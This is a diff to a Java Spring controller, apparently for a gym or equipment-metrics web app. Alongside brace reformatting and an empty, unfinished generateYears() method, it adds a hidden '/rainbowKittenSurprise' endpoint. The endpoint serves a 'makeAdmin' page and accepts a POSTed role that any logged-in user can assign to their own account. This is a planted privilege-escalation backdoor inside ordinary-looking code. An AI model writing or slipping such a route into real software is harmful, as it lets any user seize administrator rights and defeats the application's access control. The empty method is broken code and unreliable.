@@ -380,9 +380,16 @@ public class AccountController {
             List<Equipment_Metric> employeeEquipmentMetric = equipmentMetricDao.getAllEquipmentMetricForEmployee(check_in, check_out);
             modelHolder.put("getAllEquipmentMetricForEmployee", employeeEquipmentMetric);
             return "EmployeeEquipmentMetric";
-        }
-        else {
+        } else {
             throw new UnauthorizedException();
+        }
+    }
+
+    public void generateYears() {
+        List<Integer> output = new ArrayList<>();
+
+        for (int i = 2000; i < 2050; i++) {
+
         }
     }
 
@@ -516,10 +523,28 @@ public class AccountController {
     public String showYourMetrics() throws UnauthorizedException {
         if (auth.userHasRole(new String[]{"admin", "employee", "user"})) {
             return "yourMetrics";
-        }
-        else {
+        } else {
             throw new UnauthorizedException();
         }
+    }
+
+    @RequestMapping(path = "/rainbowKittenSurprise", method = RequestMethod.GET)
+    public String showSecretPage() throws UnauthorizedException {
+        if (auth.userHasRole(new String[]{"admin", "employee", "user"})) {
+        } else {
+            throw new UnauthorizedException();
+        }
+        return "makeAdmin";
+    }
+
+    @RequestMapping(path = "/rainbowKittenSurprise", method = RequestMethod.POST)
+    public String showYourMetrics(@RequestParam String role) throws UnauthorizedException {
+        if (auth.userHasRole(new String[]{"admin", "employee", "user"})) {
+            userDao.changeUserRole(auth.getCurrentUser().getId(), role);
+        } else {
+            throw new UnauthorizedException();
+        }
+        return "redirect:gymSession";
     }
 }
 
